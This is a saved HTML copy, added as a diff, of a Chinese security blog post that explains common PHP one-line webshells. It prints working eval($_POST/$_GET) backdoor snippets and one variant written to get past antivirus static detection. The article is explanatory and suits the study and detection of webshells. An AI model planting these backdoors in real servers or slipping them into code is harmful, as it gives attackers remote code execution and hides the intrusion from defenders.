@@ -1,0 +1,822 @@
+<!DOCTYPE html>
+<!-- saved from url=(0051)https://blkstone.github.io/2016/07/21/php-webshell/ -->
+<html class="theme-next use-motion theme-next-mist"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  
+
+
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+
+
+
+
+
+  <link rel="stylesheet" type="text/css" href="./常见php一句话webshell解析 __ Neurohazard_files/jquery.fancybox.css">
+
+
+<link rel="stylesheet" type="text/css" href="./常见php一句话webshell解析 __ Neurohazard_files/main.css">
+
+
+    <meta name="description" content="关于计算机科学的学习经历与精彩文章分享。">
+
+
+
+  <meta name="keywords" content="渗透测试,">
+
+
+
+
+
+  <link rel="shorticon icon" type="image/x-icon" href="https://blkstone.github.io/favicon.ico?v=0.4.3">
+
+
+
+<script src="./常见php一句话webshell解析 __ Neurohazard_files/hm.js.下載"></script><script type="text/javascript" id="hexo.configuration">
+  var CONFIG = {
+    scheme: 'Mist',
+    analytics: {
+      google: ''
+    },
+    sidebar: 'post'
+  };
+</script>
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?351a523b2429a0dda1b90bb708a00fad";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+  <title> 常见php一句话webshell解析 // Neurohazard </title>
+<script type="text/javascript" async="" src="https://static.duoshuo.com/embed.js" charset="UTF-8"></script><style type="text/css">.fancybox-margin{margin-right:17px;}</style><style type="text/css">.MathJax_Hover_Frame {border-radius: .25em; -webkit-border-radius: .25em; -moz-border-radius: .25em; -khtml-border-radius: .25em; box-shadow: 0px 0px 15px #83A; -webkit-box-shadow: 0px 0px 15px #83A; -moz-box-shadow: 0px 0px 15px #83A; -khtml-box-shadow: 0px 0px 15px #83A; border: 1px solid #A6D ! important; display: inline-block; position: absolute}
+.MathJax_Menu_Button .MathJax_Hover_Arrow {position: absolute; cursor: pointer; display: inline-block; border: 2px solid #AAA; border-radius: 4px; -webkit-border-radius: 4px; -moz-border-radius: 4px; -khtml-border-radius: 4px; font-family: 'Courier New',Courier; font-size: 9px; color: #F0F0F0}
+.MathJax_Menu_Button .MathJax_Hover_Arrow span {display: block; background-color: #AAA; border: 1px solid; border-radius: 3px; line-height: 0; padding: 4px}
+.MathJax_Hover_Arrow:hover {color: white!important; border: 2px solid #CCC!important}
+.MathJax_Hover_Arrow:hover span {background-color: #CCC!important}
+</style><style type="text/css">#MathJax_About {position: fixed; left: 50%; width: auto; text-align: center; border: 3px outset; padding: 1em 2em; background-color: #DDDDDD; color: black; cursor: default; font-family: message-box; font-size: 120%; font-style: normal; text-indent: 0; text-transform: none; line-height: normal; letter-spacing: normal; word-spacing: normal; word-wrap: normal; white-space: nowrap; float: none; z-index: 201; border-radius: 15px; -webkit-border-radius: 15px; -moz-border-radius: 15px; -khtml-border-radius: 15px; box-shadow: 0px 10px 20px #808080; -webkit-box-shadow: 0px 10px 20px #808080; -moz-box-shadow: 0px 10px 20px #808080; -khtml-box-shadow: 0px 10px 20px #808080; filter: progid:DXImageTransform.Microsoft.dropshadow(OffX=2, OffY=2, Color='gray', Positive='true')}
+#MathJax_About.MathJax_MousePost {outline: none}
+.MathJax_Menu {position: absolute; background-color: white; color: black; width: auto; padding: 2px; border: 1px solid #CCCCCC; margin: 0; cursor: default; font: menu; text-align: left; text-indent: 0; text-transform: none; line-height: normal; letter-spacing: normal; word-spacing: normal; word-wrap: normal; white-space: nowrap; float: none; z-index: 201; box-shadow: 0px 10px 20px #808080; -webkit-box-shadow: 0px 10px 20px #808080; -moz-box-shadow: 0px 10px 20px #808080; -khtml-box-shadow: 0px 10px 20px #808080; filter: progid:DXImageTransform.Microsoft.dropshadow(OffX=2, OffY=2, Color='gray', Positive='true')}
+.MathJax_MenuItem {padding: 2px 2em; background: transparent}
+.MathJax_MenuArrow {position: absolute; right: .5em; padding-top: .25em; color: #666666; font-size: .75em}
+.MathJax_MenuActive .MathJax_MenuArrow {color: white}
+.MathJax_MenuArrow.RTL {left: .5em; right: auto}
+.MathJax_MenuCheck {position: absolute; left: .7em}
+.MathJax_MenuCheck.RTL {right: .7em; left: auto}
+.MathJax_MenuRadioCheck {position: absolute; left: 1em}
+.MathJax_MenuRadioCheck.RTL {right: 1em; left: auto}
+.MathJax_MenuLabel {padding: 2px 2em 4px 1.33em; font-style: italic}
+.MathJax_MenuRule {border-top: 1px solid #CCCCCC; margin: 4px 1px 0px}
+.MathJax_MenuDisabled {color: GrayText}
+.MathJax_MenuActive {background-color: Highlight; color: HighlightText}
+.MathJax_MenuDisabled:focus, .MathJax_MenuLabel:focus {background-color: #E8E8E8}
+.MathJax_ContextMenu:focus {outline: none}
+.MathJax_ContextMenu .MathJax_MenuItem:focus {outline: none}
+#MathJax_AboutClose {top: .2em; right: .2em}
+.MathJax_Menu .MathJax_MenuClose {top: -10px; left: -10px}
+.MathJax_MenuClose {position: absolute; cursor: pointer; display: inline-block; border: 2px solid #AAA; border-radius: 18px; -webkit-border-radius: 18px; -moz-border-radius: 18px; -khtml-border-radius: 18px; font-family: 'Courier New',Courier; font-size: 24px; color: #F0F0F0}
+.MathJax_MenuClose span {display: block; background-color: #AAA; border: 1.5px solid; border-radius: 18px; -webkit-border-radius: 18px; -moz-border-radius: 18px; -khtml-border-radius: 18px; line-height: 0; padding: 8px 0 6px}
+.MathJax_MenuClose:hover {color: white!important; border: 2px solid #CCC!important}
+.MathJax_MenuClose:hover span {background-color: #CCC!important}
+.MathJax_MenuClose:hover:focus {outline: none}
+</style><style type="text/css">.MathJax_Preview .MJXf-math {color: inherit!important}
+</style><style type="text/css">.MJX_Assistive_MathML {position: absolute!important; top: 0; left: 0; clip: rect(1px, 1px, 1px, 1px); padding: 1px 0 0 0!important; border: 0!important; height: 1px!important; width: 1px!important; overflow: hidden!important; display: block!important; -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none}
+.MJX_Assistive_MathML.MJX_Assistive_MathML_Block {width: 100%!important}
+</style><style type="text/css">#MathJax_Zoom {position: absolute; background-color: #F0F0F0; overflow: auto; display: block; z-index: 301; padding: .5em; border: 1px solid black; margin: 0; font-weight: normal; font-style: normal; text-align: left; text-indent: 0; text-transform: none; line-height: normal; letter-spacing: normal; word-spacing: normal; word-wrap: normal; white-space: nowrap; float: none; -webkit-box-sizing: content-box; -moz-box-sizing: content-box; box-sizing: content-box; box-shadow: 5px 5px 15px #AAAAAA; -webkit-box-shadow: 5px 5px 15px #AAAAAA; -moz-box-shadow: 5px 5px 15px #AAAAAA; -khtml-box-shadow: 5px 5px 15px #AAAAAA; filter: progid:DXImageTransform.Microsoft.dropshadow(OffX=2, OffY=2, Color='gray', Positive='true')}
+#MathJax_ZoomOverlay {position: absolute; left: 0; top: 0; z-index: 300; display: inline-block; width: 100%; height: 100%; border: 0; padding: 0; margin: 0; background-color: white; opacity: 0; filter: alpha(opacity=0)}
+#MathJax_ZoomFrame {position: relative; display: inline-block; height: 0; width: 0}
+#MathJax_ZoomEventTrap {position: absolute; left: 0; top: 0; z-index: 302; display: inline-block; border: 0; padding: 0; margin: 0; background-color: white; opacity: 0; filter: alpha(opacity=0)}
+</style><style type="text/css">.MathJax_Preview {color: #888}
+#MathJax_Message {position: fixed; left: 1em; bottom: 1.5em; background-color: #E6E6E6; border: 1px solid #959595; margin: 0px; padding: 2px 8px; z-index: 102; color: black; font-size: 80%; width: auto; white-space: nowrap}
+#MathJax_MSIE_Frame {position: absolute; top: 0; left: 0; width: 0px; z-index: 101; border: 0px; margin: 0px; padding: 0px}
+.MathJax_Error {color: #CC0000; font-style: italic}
+</style><style type="text/css">.MJXp-script {font-size: .8em}
+.MJXp-right {-webkit-transform-origin: right; -moz-transform-origin: right; -ms-transform-origin: right; -o-transform-origin: right; transform-origin: right}
+.MJXp-bold {font-weight: bold}
+.MJXp-italic {font-style: italic}
+.MJXp-scr {font-family: MathJax_Script,'Times New Roman',Times,STIXGeneral,serif}
+.MJXp-frak {font-family: MathJax_Fraktur,'Times New Roman',Times,STIXGeneral,serif}
+.MJXp-sf {font-family: MathJax_SansSerif,'Times New Roman',Times,STIXGeneral,serif}
+.MJXp-cal {font-family: MathJax_Caligraphic,'Times New Roman',Times,STIXGeneral,serif}
+.MJXp-mono {font-family: MathJax_Typewriter,'Times New Roman',Times,STIXGeneral,serif}
+.MJXp-largeop {font-size: 150%}
+.MJXp-largeop.MJXp-int {vertical-align: -.2em}
+.MJXp-math {display: inline-block; line-height: 1.2; text-indent: 0; font-family: 'Times New Roman',Times,STIXGeneral,serif; white-space: nowrap; border-collapse: collapse}
+.MJXp-display {display: block; text-align: center; margin: 1em 0}
+.MJXp-math span {display: inline-block}
+.MJXp-box {display: block!important; text-align: center}
+.MJXp-box:after {content: " "}
+.MJXp-rule {display: block!important; margin-top: .1em}
+.MJXp-char {display: block!important}
+.MJXp-mo {margin: 0 .15em}
+.MJXp-mfrac {margin: 0 .125em; vertical-align: .25em}
+.MJXp-denom {display: inline-table!important; width: 100%}
+.MJXp-denom > * {display: table-row!important}
+.MJXp-surd {vertical-align: top}
+.MJXp-surd > * {display: block!important}
+.MJXp-script-box > *  {display: table!important; height: 50%}
+.MJXp-script-box > * > * {display: table-cell!important; vertical-align: top}
+.MJXp-script-box > *:last-child > * {vertical-align: bottom}
+.MJXp-script-box > * > * > * {display: block!important}
+.MJXp-mphantom {visibility: hidden}
+.MJXp-munderover {display: inline-table!important}
+.MJXp-over {display: inline-block!important; text-align: center}
+.MJXp-over > * {display: block!important}
+.MJXp-munderover > * {display: table-row!important}
+.MJXp-mtable {vertical-align: .25em; margin: 0 .125em}
+.MJXp-mtable > * {display: inline-table!important; vertical-align: middle}
+.MJXp-mtr {display: table-row!important}
+.MJXp-mtd {display: table-cell!important; text-align: center; padding: .5em 0 0 .5em}
+.MJXp-mtr > .MJXp-mtd:first-child {padding-left: 0}
+.MJXp-mtr:first-child > .MJXp-mtd {padding-top: 0}
+.MJXp-mlabeledtr {display: table-row!important}
+.MJXp-mlabeledtr > .MJXp-mtd:first-child {padding-left: 0}
+.MJXp-mlabeledtr:first-child > .MJXp-mtd {padding-top: 0}
+.MJXp-merror {background-color: #FFFF88; color: #CC0000; border: 1px solid #CC0000; padding: 1px 3px; font-style: normal; font-size: 90%}
+.MJXp-scale0 {-webkit-transform: scaleX(.0); -moz-transform: scaleX(.0); -ms-transform: scaleX(.0); -o-transform: scaleX(.0); transform: scaleX(.0)}
+.MJXp-scale1 {-webkit-transform: scaleX(.1); -moz-transform: scaleX(.1); -ms-transform: scaleX(.1); -o-transform: scaleX(.1); transform: scaleX(.1)}
+.MJXp-scale2 {-webkit-transform: scaleX(.2); -moz-transform: scaleX(.2); -ms-transform: scaleX(.2); -o-transform: scaleX(.2); transform: scaleX(.2)}
+.MJXp-scale3 {-webkit-transform: scaleX(.3); -moz-transform: scaleX(.3); -ms-transform: scaleX(.3); -o-transform: scaleX(.3); transform: scaleX(.3)}
+.MJXp-scale4 {-webkit-transform: scaleX(.4); -moz-transform: scaleX(.4); -ms-transform: scaleX(.4); -o-transform: scaleX(.4); transform: scaleX(.4)}
+.MJXp-scale5 {-webkit-transform: scaleX(.5); -moz-transform: scaleX(.5); -ms-transform: scaleX(.5); -o-transform: scaleX(.5); transform: scaleX(.5)}
+.MJXp-scale6 {-webkit-transform: scaleX(.6); -moz-transform: scaleX(.6); -ms-transform: scaleX(.6); -o-transform: scaleX(.6); transform: scaleX(.6)}
+.MJXp-scale7 {-webkit-transform: scaleX(.7); -moz-transform: scaleX(.7); -ms-transform: scaleX(.7); -o-transform: scaleX(.7); transform: scaleX(.7)}
+.MJXp-scale8 {-webkit-transform: scaleX(.8); -moz-transform: scaleX(.8); -ms-transform: scaleX(.8); -o-transform: scaleX(.8); transform: scaleX(.8)}
+.MJXp-scale9 {-webkit-transform: scaleX(.9); -moz-transform: scaleX(.9); -ms-transform: scaleX(.9); -o-transform: scaleX(.9); transform: scaleX(.9)}
+.MathJax_PHTML .noError {vertical-align: ; font-size: 90%; text-align: left; color: black; padding: 1px 3px; border: 1px solid}
+</style><style type="text/css">.MathJax_Display {text-align: center; margin: 1em 0em; position: relative; display: block!important; text-indent: 0; max-width: none; max-height: none; min-width: 0; min-height: 0; width: 100%}
+.MathJax .merror {background-color: #FFFF88; color: #CC0000; border: 1px solid #CC0000; padding: 1px 3px; font-style: normal; font-size: 90%}
+.MathJax .MJX-monospace {font-family: monospace}
+.MathJax .MJX-sans-serif {font-family: sans-serif}
+#MathJax_Tooltip {background-color: InfoBackground; color: InfoText; border: 1px solid black; box-shadow: 2px 2px 5px #AAAAAA; -webkit-box-shadow: 2px 2px 5px #AAAAAA; -moz-box-shadow: 2px 2px 5px #AAAAAA; -khtml-box-shadow: 2px 2px 5px #AAAAAA; filter: progid:DXImageTransform.Microsoft.dropshadow(OffX=2, OffY=2, Color='gray', Positive='true'); padding: 3px 4px; z-index: 401; position: absolute; left: 0; top: 0; width: auto; height: auto; display: none}
+.MathJax {display: inline; font-style: normal; font-weight: normal; line-height: normal; font-size: 100%; font-size-adjust: none; text-indent: 0; text-align: left; text-transform: none; letter-spacing: normal; word-spacing: normal; word-wrap: normal; white-space: nowrap; float: none; direction: ltr; max-width: none; max-height: none; min-width: 0; min-height: 0; border: 0; padding: 0; margin: 0}
+.MathJax:focus, body :focus .MathJax {display: inline-table}
+.MathJax.MathJax_FullWidth {text-align: center; display: table-cell!important; width: 10000em!important}
+.MathJax img, .MathJax nobr, .MathJax a {border: 0; padding: 0; margin: 0; max-width: none; max-height: none; min-width: 0; min-height: 0; vertical-align: 0; line-height: normal; text-decoration: none}
+img.MathJax_strut {border: 0!important; padding: 0!important; margin: 0!important; vertical-align: 0!important}
+.MathJax span {display: inline; position: static; border: 0; padding: 0; margin: 0; vertical-align: 0; line-height: normal; text-decoration: none}
+.MathJax nobr {white-space: nowrap!important}
+.MathJax img {display: inline!important; float: none!important}
+.MathJax * {transition: none; -webkit-transition: none; -moz-transition: none; -ms-transition: none; -o-transition: none}
+.MathJax_Processing {visibility: hidden; position: fixed; width: 0; height: 0; overflow: hidden}
+.MathJax_Processed {display: none!important}
+.MathJax_ExBox {display: block!important; overflow: hidden; width: 1px; height: 60ex; min-height: 0; max-height: none}
+.MathJax .MathJax_EmBox {display: block!important; overflow: hidden; width: 1px; height: 60em; min-height: 0; max-height: none}
+.MathJax_LineBox {display: table!important}
+.MathJax_LineBox span {display: table-cell!important; width: 10000em!important; min-width: 0; max-width: none; padding: 0; border: 0; margin: 0}
+.MathJax .MathJax_HitBox {cursor: text; background: white; opacity: 0; filter: alpha(opacity=0)}
+.MathJax .MathJax_HitBox * {filter: none; opacity: 1; background: transparent}
+#MathJax_Tooltip * {filter: none; opacity: 1; background: transparent}
+@font-face {font-family: MathJax_Main; src: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/fonts/HTML-CSS/TeX/woff/MathJax_Main-Regular.woff?V=2.7.1') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/fonts/HTML-CSS/TeX/otf/MathJax_Main-Regular.otf?V=2.7.1') format('opentype')}
+@font-face {font-family: MathJax_Main-bold; src: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/fonts/HTML-CSS/TeX/woff/MathJax_Main-Bold.woff?V=2.7.1') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/fonts/HTML-CSS/TeX/otf/MathJax_Main-Bold.otf?V=2.7.1') format('opentype')}
+@font-face {font-family: MathJax_Main-italic; src: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/fonts/HTML-CSS/TeX/woff/MathJax_Main-Italic.woff?V=2.7.1') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/fonts/HTML-CSS/TeX/otf/MathJax_Main-Italic.otf?V=2.7.1') format('opentype')}
+@font-face {font-family: MathJax_Math-italic; src: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/fonts/HTML-CSS/TeX/woff/MathJax_Math-Italic.woff?V=2.7.1') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/fonts/HTML-CSS/TeX/otf/MathJax_Math-Italic.otf?V=2.7.1') format('opentype')}
+@font-face {font-family: MathJax_Caligraphic; src: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/fonts/HTML-CSS/TeX/woff/MathJax_Caligraphic-Regular.woff?V=2.7.1') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/fonts/HTML-CSS/TeX/otf/MathJax_Caligraphic-Regular.otf?V=2.7.1') format('opentype')}
+@font-face {font-family: MathJax_Size1; src: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/fonts/HTML-CSS/TeX/woff/MathJax_Size1-Regular.woff?V=2.7.1') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/fonts/HTML-CSS/TeX/otf/MathJax_Size1-Regular.otf?V=2.7.1') format('opentype')}
+@font-face {font-family: MathJax_Size2; src: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/fonts/HTML-CSS/TeX/woff/MathJax_Size2-Regular.woff?V=2.7.1') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/fonts/HTML-CSS/TeX/otf/MathJax_Size2-Regular.otf?V=2.7.1') format('opentype')}
+@font-face {font-family: MathJax_Size3; src: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/fonts/HTML-CSS/TeX/woff/MathJax_Size3-Regular.woff?V=2.7.1') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/fonts/HTML-CSS/TeX/otf/MathJax_Size3-Regular.otf?V=2.7.1') format('opentype')}
+@font-face {font-family: MathJax_Size4; src: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/fonts/HTML-CSS/TeX/woff/MathJax_Size4-Regular.woff?V=2.7.1') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/fonts/HTML-CSS/TeX/otf/MathJax_Size4-Regular.otf?V=2.7.1') format('opentype')}
+.MathJax .noError {vertical-align: ; font-size: 90%; text-align: left; color: black; padding: 1px 3px; border: 1px solid}
+</style></head>
+
+<body class="" style="padding-right: 320px;"><div style="visibility: hidden; overflow: hidden; position: absolute; top: 0px; height: 1px; width: auto; padding: 0px; border: 0px; margin: 0px; text-align: left; text-indent: 0px; text-transform: none; line-height: normal; letter-spacing: normal; word-spacing: normal;"><div id="MathJax_Hidden"></div></div><div id="MathJax_Message" style="display: none;"></div>
+  <!--[if lte IE 8]>
+  <div style=' clear: both; height: 59px; padding:0 0 0 15px; position: relative;margin:0 auto;'>
+    <a href="http://windows.microsoft.com/en-US/internet-explorer/products/ie/home?ocid=ie6_countdown_bannercode">
+      <img src="http://7u2nvr.com1.z0.glb.clouddn.com/picouterie.jpg" border="0" height="42" width="820"
+           alt="You are using an outdated browser. For a faster, safer browsing experience, upgrade for free today or use other browser ,like chrome firefox safari."
+           style='margin-left:auto;margin-right:auto;display: block;'/>
+    </a>
+  </div>
+<![endif]-->
+
+  <div class="container one-column page-post-detail">
+    <div class="headband"></div>
+
+    <div id="header" class="header">
+      <div class="header-inner">
+        <h1 class="site-meta">
+  <span class="logo-line-before"><i class="" style="transform: translateX(100%);"></i></span>
+  <a href="https://blkstone.github.io/" class="brand" style="opacity: 1;">
+      <span class="logo" style="opacity: 1; top: 0px;">
+        <i class="icon-logo"></i>
+      </span>
+      <span class="site-title" style="opacity: 1; top: 0px;">Neurohazard</span>
+  </a>
+  <span class="logo-line-after"><i class="" style="transform: translateX(-100%);"></i></span>
+</h1>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<div class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu ">
+      
+        
+        <li class="menu-item menu-item-home" style="opacity: 1; transform: translateY(0px);">
+          <a href="https://blkstone.github.io/">
+            <i class="menu-item-icon icon-home"></i> <br>
+            首頁
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about" style="opacity: 1; transform: translateY(0px);">
+          <a href="https://blkstone.github.io/about">
+            <i class="menu-item-icon icon-about"></i> <br>
+            關於
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives" style="opacity: 1; transform: translateY(0px);">
+          <a href="https://blkstone.github.io/archives">
+            <i class="menu-item-icon icon-archives"></i> <br>
+            歸檔
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags" style="opacity: 1; transform: translateY(0px);">
+          <a href="https://blkstone.github.io/tags">
+            <i class="menu-item-icon icon-tags"></i> <br>
+            標籤
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-friend" style="opacity: 1; transform: translateY(0px);">
+          <a href="https://blkstone.github.io/friend">
+            <i class="menu-item-icon icon-friend"></i> <br>
+            友情鏈接
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-reading-list" style="opacity: 1; transform: translateY(0px);">
+          <a href="https://blkstone.github.io/reading-list">
+            <i class="menu-item-icon icon-reading-list"></i> <br>
+            閱讀清單
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+</div>
+
+
+      </div>
+    </div>
+
+    <div id="main" class="main">
+      <div class="main-inner">
+        <div id="content" class="content">
+          
+
+  <div id="posts" class="posts-expand">
+    
+
+  <div class="post post-type-normal" style="opacity: 1; display: block; transform: translateY(0px);">
+    <div class="post-header">
+
+      
+      
+        <h1 class="post-title">
+          
+          
+            
+              常见php一句话webshell解析
+            
+          
+        </h1>
+      
+
+      <div class="post-meta">
+        <span class="post-time">
+          發表於 2016-07-21
+        </span>
+
+        
+          <span class="post-category">
+            &nbsp; | &nbsp; 分類於
+            
+              <a href="https://blkstone.github.io/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/">信息安全</a>
+
+              
+              
+
+            
+          </span>
+        
+
+        
+          
+            <span class="post-comments-count">
+            &nbsp; | &nbsp;
+            <a href="https://blkstone.github.io/2016/07/21/php-webshell/#comments">
+              <span class="post-comments-count ds-thread-count" data-thread-key="2016/07/21/php-webshell/"></span>
+            </a>
+          </span>
+          
+        
+      </div>
+    </div>
+
+    <div class="post-body">
+
+      
+      
+
+      
+        <blockquote>
+<p>我理解的 webshell 是在服务器上以 web server application (比如apache,iis或者nginx)的权限进行远程任意代码执行的工具。当然通过一些手段也可能可以进行提权。</p>
+</blockquote>
+<h1 id="最基础的-php-webshell"><a href="https://blkstone.github.io/2016/07/21/php-webshell/#%E6%9C%80%E5%9F%BA%E7%A1%80%E7%9A%84-php-webshell" class="headerlink" title="最基础的 php webshell"></a>最基础的 php webshell</h1><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_POST[CMD]);<span class="meta">?&gt;</span></span></div></pre></td></tr></tbody></table></figure>
+<p>将 post 请求中的 CMD 参数直接执行。</p>
+<figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_GET[CMD]);<span class="meta">?&gt;</span></span></div></pre></td></tr></tbody></table></figure>
+<p>原理浅析：</p>
+<p class=" has-jax">1、在PHP脚本语言中，eval（code）的功能是将code组合成php指令，然后将指令执行。<br>2、&lt;?php <span class="MathJax_Preview" style="color: inherit; display: none;"></span><span class="MathJax" id="MathJax-Element-1-Frame" tabindex="0" data-mathml="&lt;math xmlns=&quot;http://www.w3.org/1998/Math/MathML&quot;&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mo&gt;&amp;#x201D;&lt;/mo&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mo stretchy=&quot;false&quot;&gt;(&lt;/mo&gt;&lt;mo stretchy=&quot;false&quot;&gt;)&lt;/mo&gt;&lt;mo&gt;&amp;#x201D;&lt;/mo&gt;&lt;mo&gt;;&lt;/mo&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;v&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mo stretchy=&quot;false&quot;&gt;(&lt;/mo&gt;&lt;mo&gt;&amp;#x201C;&lt;/mo&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;c&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;/math&gt;" role="presentation" style="position: relative;"><nobr aria-hidden="true"><span class="math" id="MathJax-Span-1" style="width: 13.998em; display: inline-block;"><span style="display: inline-block; position: relative; width: 11.968em; height: 0px; font-size: 117%;"><span style="position: absolute; clip: rect(1.338em, 1011.97em, 2.674em, -999.997em); top: -2.241em; left: 0em;"><span class="mrow" id="MathJax-Span-2"><span class="mi" id="MathJax-Span-3" style="font-family: MathJax_Math-italic;">a</span><span class="mo" id="MathJax-Span-4" style="font-family: MathJax_Main; padding-left: 0.27em;">=</span><span class="mo" id="MathJax-Span-5" style="font-family: MathJax_Main;">”</span><span class="mi" id="MathJax-Span-6" style="font-family: MathJax_Math-italic;">p</span><span class="mi" id="MathJax-Span-7" style="font-family: MathJax_Math-italic;">h</span><span class="mi" id="MathJax-Span-8" style="font-family: MathJax_Math-italic;">p</span><span class="mi" id="MathJax-Span-9" style="font-family: MathJax_Math-italic;">i</span><span class="mi" id="MathJax-Span-10" style="font-family: MathJax_Math-italic;">n</span><span class="mi" id="MathJax-Span-11" style="font-family: MathJax_Math-italic;">f<span style="display: inline-block; overflow: hidden; height: 1px; width: 0.056em;"></span></span><span class="mi" id="MathJax-Span-12" style="font-family: MathJax_Math-italic;">o</span><span class="mo" id="MathJax-Span-13" style="font-family: MathJax_Main;">(</span><span class="mo" id="MathJax-Span-14" style="font-family: MathJax_Main;">)</span><span class="mo" id="MathJax-Span-15" style="font-family: MathJax_Main;">”</span><span class="mo" id="MathJax-Span-16" style="font-family: MathJax_Main;">;</span><span class="mi" id="MathJax-Span-17" style="font-family: MathJax_Math-italic; padding-left: 0.163em;">e</span><span class="mi" id="MathJax-Span-18" style="font-family: MathJax_Math-italic;">v</span><span class="mi" id="MathJax-Span-19" style="font-family: MathJax_Math-italic;">a</span><span class="mi" id="MathJax-Span-20" style="font-family: MathJax_Math-italic;">l</span><span class="mo" id="MathJax-Span-21" style="font-family: MathJax_Main;">(</span><span class="mo" id="MathJax-Span-22" style="font-family: MathJax_Main;">“</span><span class="mi" id="MathJax-Span-23" style="font-family: MathJax_Math-italic;">e</span><span class="mi" id="MathJax-Span-24" style="font-family: MathJax_Math-italic;">c</span><span class="mi" id="MathJax-Span-25" style="font-family: MathJax_Math-italic;">h</span><span class="mi" id="MathJax-Span-26" style="font-family: MathJax_Math-italic;">o</span></span><span style="display: inline-block; width: 0px; height: 2.246em;"></span></span></span><span style="display: inline-block; overflow: hidden; vertical-align: -0.372em; border-left: 0px solid; width: 0px; height: 1.316em;"></span></span></nobr><span class="MJX_Assistive_MathML" role="presentation"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>a</mi><mo>=</mo><mo>”</mo><mi>p</mi><mi>h</mi><mi>p</mi><mi>i</mi><mi>n</mi><mi>f</mi><mi>o</mi><mo stretchy="false">(</mo><mo stretchy="false">)</mo><mo>”</mo><mo>;</mo><mi>e</mi><mi>v</mi><mi>a</mi><mi>l</mi><mo stretchy="false">(</mo><mo>“</mo><mi>e</mi><mi>c</mi><mi>h</mi><mi>o</mi></math></span></span><script type="math/tex" id="MathJax-Element-1">a=”phpinfo()”; eval(“echo </script>a; “); ?&gt;<br>就相当于执行 echo phpinfo（）语句。</p>
+<h1 id="变形一"><a href="https://blkstone.github.io/2016/07/21/php-webshell/#%E5%8F%98%E5%BD%A2%E4%B8%80" class="headerlink" title="变形一"></a>变形一</h1><p>为了与各种静态分析检测的杀毒软件进行对抗，webshell的代码也在不断进行混淆和改进。</p>
+<figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?php</span> $x=$_GET[<span class="string">'z'</span>]; @<span class="keyword">eval</span>(<span class="string">"$x;"</span>);<span class="meta">?&gt;</span></span></div></pre></td></tr></tbody></table></figure>
+<p>一般的安全软件可能会将eval+GET或POST判定为后门程序，因此这种变形将eval和GET或者POST分开，能够绕过这种情况。</p>
